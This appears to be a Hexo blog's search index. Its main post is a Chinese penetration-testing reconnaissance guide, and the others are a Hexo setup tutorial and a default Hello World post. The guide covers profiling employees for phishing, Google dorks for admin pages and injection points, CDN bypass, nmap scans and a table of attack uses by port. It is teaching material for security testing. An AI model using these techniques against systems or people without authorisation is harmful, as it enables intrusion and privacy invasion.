title="2.备案信息查询"></a>2.备案信息查询</h3><ul><li>备案查询我们主要关注的是：单位信息例如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。</li><li>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a><br>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>爱站网：<a href="https://www.aizhan.com/">https://www.aizhan.com/</a></li></ul><h3 id="3-企业信息查询"><a href="#3-企业信息查询" class="headerlink" title="3.企业信息查询"></a>3.企业信息查询</h3><ul><li>1.企业基本信息。</li></ul><p>2.员工信息（手机号码、邮箱、姓名等），组织框架、企业法人、企业综合信息等。<br>3.其中员工信息收集是信息收集中的一项重要工作，员工信息包括：员工姓名、员工工号、员工家庭及交际信息、上网习惯等。（社会工程学）<br>4.员工身份信息：员工简历，员工身份证，手机号，生日，家乡，住址等个人信息。5、员工社交账号信息：QQ号，QQ群，微博，微信，支付宝，员工邮箱账号等。</p><ul><li><p>可以通过天眼查等等网站 查找测试目标的身份信息  邮箱等<br>如果查到邮箱之后  <strong>在对方允许的情况下</strong> 就可以进行钓鱼测试<br>可以通过一些HR入手 在各大招聘网收集相关信息</p></li><li><p><em>用到的东西：</em>*</p><ul><li><a href="https://www.tianyancha.com天眼查/">https://www.tianyancha.com天眼查</a><br><a href="https://www.qichacha.com/%E4%BC%81%E6%9F%A5%E6%9F%A5">https://www.qichacha.com/企查查</a><br><a href="https://www.reg007.com/">https://www.reg007.com/</a>  注册过哪些网站<br><a href="https://www.email-format.com/i/search/">https://www.email-format.com/i/search/</a> 在线邮箱查询<br>Maltego 信息收集<br>各种招聘网<br><a href="https://www.aies.cn/pinyin.htm">https://www.aies.cn/pinyin.htm</a> 在线汉字转拼音<br><a href="https://github.com/shack2/SNETCracker/releases">https://github.com/shack2/SNETCracker/releases</a> 超级弱口令工具<br><a href="https://anonymousemail.me/">https://anonymousemail.me/</a> 匿名邮箱</li></ul></li><li><p>通过kali里面的Maltego对测试站点的信息收集</p><h3 id="4-JS信息收集"><a href="#4-JS信息收集" class="headerlink" title="4.JS信息收集"></a>4.JS信息收集</h3></li><li><p>通过JS收集，url，目录和参数<br>Js作为我们信息收集里面重要的一个环节很多人会忽略，Js里面可能蕴藏了很多敏感信息，组成字典fuzz效果很好。<br>用到的脚本：<br><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p><h2 id="二、子域名收集"><a href="#二、子域名收集" class="headerlink" title="二、子域名收集"></a>二、子域名收集</h2><p>子域名也就是二级域名，是指顶级域名下的域名。收集的子域名越多，我们测试的目标就越多，目标系统渗透成功的机率也越大。主站无懈可击的时候子域名是一个很好的突破口。</p><h3 id="1-工具收集"><a href="#1-工具收集" class="headerlink" title="1.工具收集"></a>1.工具收集</h3><p>layer子域名挖掘机、subDomainsBrute、K8、orangescan、DNSRecon、Sublist3r、dnsmaper、wydomain等等。此类工具github都有下载地址和使用方法。</p></li><li><p>*SubDomainBrute**：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p></li><li><p>*Sublist3r**：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>Layer（5.0增强版）：<a href="https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q">https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q  </a>密码:aup5</p></li></ul><h3 id="2-搜索引擎"><a href="#2-搜索引擎" class="headerlink" title="2.搜索引擎"></a>2.搜索引擎</h3><h4 id="1-google-hack语法"><a href="#1-google-hack语法" class="headerlink" title="1.google hack语法"></a>1.google hack语法</h4><ul><li>  site 指定域名<br>  intext   正文中存在关键字的网页<br>  intitle   标题中存在关键字的网页<br>  info      一些基本信息<br>  inurl    URL存在关键字的网页<br>  filetype 搜索指定文件类型    * 1、​site:baidu.com#收集百度子域名    * 2、intitle:管理登录  #查找后台管理登陆界面    * 3.filetype:php   #查找php类型主页    * 4、inurl:file   #查找url上含file的网址寻找上传漏洞​    * other<pre><code>  site:xx.com filetype:txt 查找TXT文件 其他的以此类推  查找后台  site:xx.com intext:管理  site:xx.com inurl:login  site:xx.com intitle:后台  查看服务器使用的程序  site:xx.com filetype:asp  site:xx.com filetype:php  site:xx.com filetype:jsp  site:xx.com filetype:aspx  查看上传漏洞  site:xx.com inurl:file  site:xx.com inurl:load  查找注射点  site:xx.com filetype:asp</code></pre><h4 id="2-网络组件搜索引擎"><a href="#2-网络组件搜索引擎" class="headerlink" title="2.网络组件搜索引擎"></a>2.网络组件搜索引擎</h4>如shodanhq.com、zoomeye.org、<a href="http://www.fofa.so/">www.fofa.so</a><h4 id="3-第三方聚合应用枚举"><a href="#3-第三方聚合应用枚举" class="headerlink" title="3.第三方聚合应用枚举"></a>3.第三方聚合应用枚举</h4></li><li><em>第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。</em>*<br>（1）VirusTotal：<a href="https://www.virustotal.com/#/home/search">https://www.virustotal.com/#/home/search</a><br>（2）DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> <h2 id="三、收集敏感信息"><a href="#三、收集敏感信息" class="headerlink" title="三、收集敏感信息"></a>三、收集敏感信息</h2></li><li>*讲解**：当某些站点无法直接通过技术层面进行渗透时，或者无法通过扫描进行信息收集时。这时候可利用搜索引擎搜索目标站点暴露在互联网上的关联信息。例如：数据库文件、sql注入、服务器配置信息、甚至是通过git找到站点泄露源代码、robots.txt等敏感信息。从而达到渗透测试目的。<h3 id="1-github敏感信息泄露"><a href="#1-github敏感信息泄露" class="headerlink" title="1.github敏感信息泄露"></a>1.github敏感信息泄露</h3>当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。<br>详细语法请参考一下链接<br><a href="https://www.cnblogs.com/ichunqiu/p/10149471.html">https://www.cnblogs.com/ichunqiu/p/10149471.html</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a><h3 id="2-通过谷歌语法进行信息收集"><a href="#2-通过谷歌语法进行信息收集" class="headerlink" title="2.通过谷歌语法进行信息收集"></a>2.通过谷歌语法进行信息收集</h3>googlehack是指使用google等搜索引擎对某些特定的网络主机暴露在公网上的信息进行搜索，已达到快速搜集相关敏感信息并进行利用的目的。<h3 id="3-工具主动扫描"><a href="#3-工具主动扫描" class="headerlink" title="3.工具主动扫描"></a>3.工具主动扫描</h3><h4 id="敏感目录文件"><a href="#敏感目录文件" class="headerlink" title="敏感目录文件"></a>敏感目录文件</h4></li><li>*讲解**：在渗透信息收集攻击中，收集敏感目录文件是非常关键的一步，可以帮助攻击者识别网站存在多少个目录，多少个页面，探索出网站的整体结构。还可以发现网站暴露在互联网的敏感文件、后台文件、数据库文件等</li><li>Google语法是万能的<br>DirBuster（kali自带的一款扫描工具）<br>Webdirscan（python编写的简易的扫描工具）<br>御剑（操作简易方便）<br>dirmap（一款高级web目录扫描工具，功能比较强大）<br>7kbstorm <a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a><br>爬虫（AWVS、Burpsuite、北极熊等）</li></ul><p>这些工具都自带字典，也可以自己手动添加，拥有强大的字典也是很关键的</p><h2 id="四、指纹识别"><a href="#四、指纹识别" class="headerlink" title="四、指纹识别"></a>四、指纹识别</h2><p><strong>讲解</strong>：指纹包含网站cms指纹、主机操作系统指纹、web容器指纹等。应用程序一般在html、jss、css等网站文件中包含一些特征码，另外http响应头中往往也会包含一些特征如x-powered-by、cookies等，这些特征码就是指纹信息的重要组成部分。</p><p>在web渗透过程中，对目标网站的指纹识别非常关键，通过工具扫描或者人工测试来识别cms系统是自建还是二次开发，还是直接使用公开的cms程序。通过获取的这些信息来决定后续渗透的思路和策略。指纹识别是黑客攻击环节中一个非常重要的阶段，也是是信息收集中的一个关键环节。<br><strong>方式</strong>：</p><ul><li>1、通过指定特殊目录或者特殊文件<br>  2、底部信息@pwoered by<br>  3、html中注释掉的内容<br>  4、robots.txt文件中的关键字<br>  5、火狐wappalyzer插件<br>  6、whatweb工具<br>  7、潮汐指纹：<a href="http://finger.tidesec.net/">http://finger.tidesec.net</a><br>  8、CMS识别工具 <a href="http://whatweb.bugscaner.com/look">http://whatweb.bugscaner.com/look</a><br>  CMS漏洞利用：确定了cms版本后，这里可以通过百度搜索相应漏洞<h2 id="五、Waf识别"><a href="#五、Waf识别" class="headerlink" title="五、Waf识别"></a>五、Waf识别</h2>Waf也叫Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</li><li><em>方式：</em>*</li><li>手工 提交恶意数据</li><li>工具（WAFW00F<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f  </a>、Nmap）</li></ul><p>1.Nmap探测WAF有两种脚本。<br>一种是http-waf-detect。</p><blockquote><p>命令：nmap  -p80,443  –script=http-waf-detect  ip</p></blockquote><pre><code>一种是http-waf-fingerprint。&gt;命令：nmap  -p80,443  --script=http-waf-fingerprint  ip</code></pre><h2 id="六、旁站、C段"><a href="#六、旁站、C段" class="headerlink" title="六、旁站、C段"></a>六、旁站、C段</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。<br>C端：是和目标服务器ip处在同一个C段的其它服务器。<br>旁站和C段的查询方式：</p><ul><li>(1）利用Bing.com，语法为：<a href="http://cn.bing.com/search?q=ip:111.111.111.111">http://cn.bing.com/search?q=ip:111.111.111.111</a><br>  （2）站长之家：<a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a><br>  （3）利用Google，语法：site:125.125.125.<br>  （4）利用Nmap，语法：nmap  -p  80,8080  –open  ip/24<br>  （5）K8工具、御剑、北极熊扫描器等<br>  （6）在线：<a href="http://www.webscan.cc/">http://www.webscan.cc/</a> <h2 id="七、真实ip"><a href="#七、真实ip" class="headerlink" title="七、真实ip"></a>七、真实ip</h2><h3 id="是否有CDN"><a href="#是否有CDN" class="headerlink" title="是否有CDN"></a>是否有CDN</h3></li></ul><p>1.确定有无cdn<br>使用全国ping 看看ip是否都是一样的 如果是不一样的就可能是使用了CDN的<br>2.使用 nslookup 进行检测，如果返回域名解析对应多个 IP 地址多半是使用了 CDN<br>3.通过谷歌插件(wapplayzer)查看判断是否有CDN</p><h3 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h3><ul><li>同国家IP地址访问查询<br>  子域名查询<br>  邮箱查询<br>  敏感文件(探针或phpinfo.php)<br>  扫描全网<br>  DNS历史记录<br>  黑暗引擎<br>  DDOS</li></ul><p>1.通过子域名判断真实ip 因为子域名一般都是没有CDN的 CDN一般都是流量大的站才有<br>2.用国外地址请求  因为CDN一般都是针对国内的用户 如果是国外的话有可能是没有CDN 的 如果是国内的目标的话<br>3.通过敏感文件查看真实的ip 如phpinfo<br>4.查看DNS记录<br>可能有目标没有挂CDN时的DNS记录<br>5.黑暗引擎</p><ul><li>zoomeye、fofa、shodan<br>  通过这些公开的安全搜索引擎爬取得历史快照，主要得一些特征总结如下：<br>  特有的http头部（如server类型、版本、cookie等信息)、<br>  特定keyword（如title、css、js、url等）、<br>  特定的IP段搜索（如fofa支持C段搜索），<br>  有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。<h2 id="八、端口信息收集"><a href="#八、端口信息收集" class="headerlink" title="八、端口信息收集"></a>八、端口信息收集</h2>通过nmap：<h3 id="Nmap常用扫描参数说明"><a href="#Nmap常用扫描参数说明" class="headerlink" title="Nmap常用扫描参数说明"></a>Nmap常用扫描参数说明</h3><img src="https://img-blog.csdnimg.cn/20210517203036646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDQ4MzU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h3 id="常见的端口信息及渗透方法："><a href="#常见的端口信息及渗透方法：" class="headerlink" title="常见的端口信息及渗透方法："></a>常见的端口信息及渗透方法：</h3><p><strong>端口号</strong>      <strong>端口服务/协议简要说明</strong>       <strong>关于端口可能的一些渗透用途</strong><br>tcp 21    ftp 默认的数据和命令传输端口[可明文亦可加密传输]  允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)<br>tcp 22    ssh[数据ssl加密传输]    可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…<br>tcp 23    telnet[明文传输]    爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获<br>tcp 25    smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]    邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑<br>tcp/udp 53    dns[域名解析]    允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控<br>tcp/udp 69    tftp[简单文件传输协议,无认证]    尝试下载目标及其的各类重要配置文件 tcp 80-89,443,8440-8450,8080-8089    web[各种常用的web服务端口]    各种常用web服务端口,可尝试经典的top n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……<br>tcp 110    [邮局协议,可明文可密文]    可尝试爆破,嗅探 tcp 137,139,445    samba[smb实现windows和linux间文件共享,明文]    可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……<br>tcp 143    imap[可明文可密文]    可尝试爆破 udp 161    snmp[明文]    爆破默认团队字符串,搜集目标内网信息<br>tcp 389    ldap[轻量级目录访问协议]    ldap注入,允许匿名访问,弱口令 tcp 512,513,514    linux rexec    可爆破,rlogin登陆<br>tcp 873    rsync备份服务    匿名访问,文件上传 tcp 1194    openvpn    想办法钓vpn账号,进内网<br>tcp 1352    Lotus domino邮件服务    弱口令,信息泄漏,爆破<br>tcp 1433    mssql数据库    注入,提权,sa弱口令,<br>爆破 tcp 1521    oracle数据库    tns爆破,注入,弹shell…<br>tcp 1500    ispmanager 主机控制面板    弱口令<br>tcp 1025,111,2049    nfs    权限配置不当<br>tcp 1723    pptp    爆破,想办法钓vpn账号,进内网<br>tcp 2082,2083    cpanel主机管理面板登录    弱口令<br>tcp 2181    zookeeper    未授权访问<br>tcp 2601,2604    zebra路由    默认密码zerbra<br>tcp 3128    squid代理服务    弱口令<br>tcp 3312,3311    kangle主机管理登录    弱口令<br>tcp 3306    mysql数据库    注入,提权,爆破<br>tcp 3389    windows rdp远程桌面    shift后门,爆破,ms12-020[蓝屏exp]<br>tcp 4848    glassfish控制台    弱口令<br>tcp 4899    radmin远程桌面管理工具, 抓密码拓展机器<br>tcp 5000    sybase/DB2数据库    爆破,注入<br>tcp 5432    postgresql数据库    爆破,注入,弱口令<br>tcp 5632    pcanywhere远程桌面管理工具    抓密码,代码执行<br>tcp 5900,5901,5902    vnc远程桌面管理工具    弱口令爆破,如果信息搜集不到位,成功几率很小<br>tcp 5984    CouchDB    未授权导致的任意指令执行<br>tcp 6379    redis未授权    可尝试未授权访问,弱口令爆破<br>tcp 7001,7002    weblogic控制台    java反序列化,弱口令<br>tcp 7778    kloxo    主机面板登录<br>tcp 8000    Ajenti主机控制面板    弱口令<br>tcp 8443    plesk主机控制面板    弱口令<br>tcp 8069    zabbix    远程执行,sql注入<br>tcp 8080-8089    Jenkins,jboss    反序列化,控制台弱口令<br>tcp 9080-9081,9090    websphere控制台    java反序列化/弱口令<br>tcp 9200,9300    elasticsearch    远程执行<br>tcp 10000    webmin linux主机web控制面板入口    弱口令<br>tcp 11211    memcached    未授权访问<br>tcp 27017,27018    mongodb    爆破,未授权访问<br>tcp 3690    svn服务    svn泄露,未授权访问<br>tcp 50000    SAP Management Console    远程执行<br>tcp 50070,50030    hadoop    默认端口未授权访问</p><h3 id="Nmap脚本分类"><a href="#Nmap脚本分类" class="headerlink" title="Nmap脚本分类"></a>Nmap脚本分类</h3><p>auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务<br>brute: 提供暴力破解方式，针对常见的应用如http/snmp等<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<br><strong>常用的有 auth   brute   vuln</strong></p>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo博客搭建</title>
    <link href="/2021/05/16/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/05/16/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h2><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="https://nodejs.org/en/">Node.js</a>(Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a><br>如果您的电脑中已经安装上述必备程序，那么恭喜您！你可以直接前往 <a href="#anzhuang">安装 Hexo</a> 步骤。<br>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。<h2 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h2></li><li>Windows：下载并安装 git.</li><li>Mac：使用 Homebrew, MacPorts 或者下载 安装程序。</li><li>Linux (Ubuntu, Debian)：sudo apt-get install git-core</li><li>Linux (Fedora, Red Hat, CentOS)：sudo yum install git-core</li></ul><blockquote><h2 id="Mac-用户"><a href="#Mac-用户" class="headerlink" title="Mac 用户"></a>Mac 用户</h2><p>如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入<br>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install 安装命令行工具。</p><h2 id="Windows-用户"><a href="#Windows-用户" class="headerlink" title="Windows 用户"></a>Windows 用户</h2><p> 对于中国大陆地区用户，可以前往 淘宝 Git for Windows 镜像 下载 git 安装包。<br>安装 Node.js<br>Node.js 为大多数平台提供了官方的 安装程序。对于中国大陆地区用户，可以前往 淘宝 Node.js 镜像 下载。</p></blockquote><h2 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2><p>Node.js 为大多数平台提供了官方的 安装程序。对于中国大陆地区用户，可以前往 淘宝 Node.js 镜像 下载。<br>其它的安装方法：</p><ul><li>Windows：通过 nvs（推荐）或者nvm 安装。</li><li>Mac：使用 Homebrew 或 MacPorts 安装。</li><li>Linux（DEB/RPM-based）：从 NodeSource 安装。<br>其它：使用相应的软件包管理器进行安装，可以参考由 Node.js 提供的 指导<br>对于 Mac 和 Linux 同样建议使用 nvs 或者 nvm，以避免可能会出现的权限问题。<h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a><span id="anzhuang">安装 Hexo</span></h2>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。<blockquote><p>$ npm install -g hexo-cli</p></blockquote><h2 id="进阶安装和使用"><a href="#进阶安装和使用" class="headerlink" title="进阶安装和使用"></a>进阶安装和使用</h2>对于熟悉 npm 的进阶用户，可以仅局部安装 hexo 包。<blockquote><p>$ npm install hexo</p></blockquote></li></ul><p>安装以后，可以使用以下两种方式执行 Hexo：<br>1.npx hexo <command><br>2.将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：</p><blockquote><p>echo ‘PATH=”$PATH:./node_modules/.bin”‘ &gt;&gt; ~/.profile</p></blockquote><h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><blockquote><p>$ hexo init <folder><br>$ cd <folder><br>$ npm install</folder></folder></p></blockquote><p>新建完成后，指定文件夹的目录如下：</p><blockquote><p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes</p></blockquote><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p>网站的 <a href="https://hexo.io/zh-cn/docs/configuration">配置</a> 信息，您可以在此配置大部分的参数。</p><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><blockquote><p>package.json<br>{<br>  “name”: “hexo-site”,<br>  “version”: “0.0.0”,<br>  “private”: true,<br>  “hexo”: {<br>    “version”: “”<br>  },<br>  “dependencies”: {<br>    “hexo”: “^3.8.0”,<br>    “hexo-generator-archive”: “^0.1.5”,<br>    “hexo-generator-category”: “^0.1.3”,<br>    “hexo-generator-index”: “^0.2.1”,<br>    “hexo-generator-tag”: “^0.2.0”,<br>    “hexo-renderer-ejs”: “^0.3.1”,<br>    “hexo-renderer-stylus”: “^0.3.3”,<br>    “hexo-renderer-marked”: “^0.3.2”,<br>    “hexo-server”: “^0.3.3”<br>  }<br>}</p></blockquote><h3 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h3><p>模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。<br>Hexo的模板是指在新建的文章文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。</p><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。</p><h3 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h3><p>主题 文件夹。Hexo 会根据主题来生成静态页面。</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><blockquote><p>$ hexo init [folder]</p></blockquote><p>新建一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站。</p><p>本命令相当于执行了以下几步：</p><ul><li>Git clone hexo-starter 和 hexo-theme-landscape 主题到当前目录或指定目录。</li><li>使用 Yarn 1、pnpm 或 npm 包管理器下载依赖（如有已安装多个，则列在前面的优先）。npm 默认随 Node.js 安装。<h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><blockquote><p>$ hexo generate</p></blockquote>生成静态文件。</li></ul><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-d, –deploy</td><td>文件生成后立即部署网站</td></tr><tr><td>-w, –watch</td><td>监视文件变动</td></tr><tr><td>-b, –bail</td><td>生成过程中如果发生任何未处理的异常则抛出异常</td></tr><tr><td>-f, –force</td><td>强制重新生成文件Hexo 引入了差分机制，如果 public 目录存在，那么 hexo 只会重新生成改动的文件。使用该参数的效果接近 hexo clean &amp;&amp; hexo generate</td></tr><tr><td>-c, –concurrency</td><td>最大同时生成文件的数量，默认无限制</td></tr></tbody></table><p>该命令可以简写为</p><blockquote><p>$ hexo g</p></blockquote><h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><blockquote><p>$ hexo publish [layout] &lt; filename &gt;</p></blockquote><p>发表草稿。</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><blockquote><p>$ hexo server</p></blockquote><p>启动服务器。默认情况下，访问网址为： <a href="http://localhost:4000/%E3%80%82">http://localhost:4000/。</a></p><blockquote><p>-p, –port    重设端口<br>-s, –static    只使用静态文件<br>-l, –log    启动日记记录，使用覆盖记录格式</p></blockquote><h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><blockquote><p>$ hexo deploy</p></blockquote><p>部署网站。</p><blockquote><p>-g, –generate    部署之前预先生成静态文件</p></blockquote><p>该命令可以简写为：</p><blockquote><p>$ hexo d</p></blockquote><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><blockquote><p>$ hexo render &lt; file1&gt; [file2] …</p></blockquote><p>渲染文件。</p><blockquote><p>-o, –output    设置输出路径</p></blockquote><h3 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h3><blockquote><p>$ hexo migrate &lt; type&gt;</p></blockquote><p>从其他博客系统 迁移内容。</p><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><blockquote><p>$ hexo clean</p></blockquote><p>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</p><p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><blockquote><p>$ hexo list &lt; type&gt;</p></blockquote><p>列出网站资料。</p><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><blockquote><p>$ hexo version</p></blockquote><p>显示 Hexo 版本。</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/05/16/hello-world/"/>
    <url>/2021/05/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
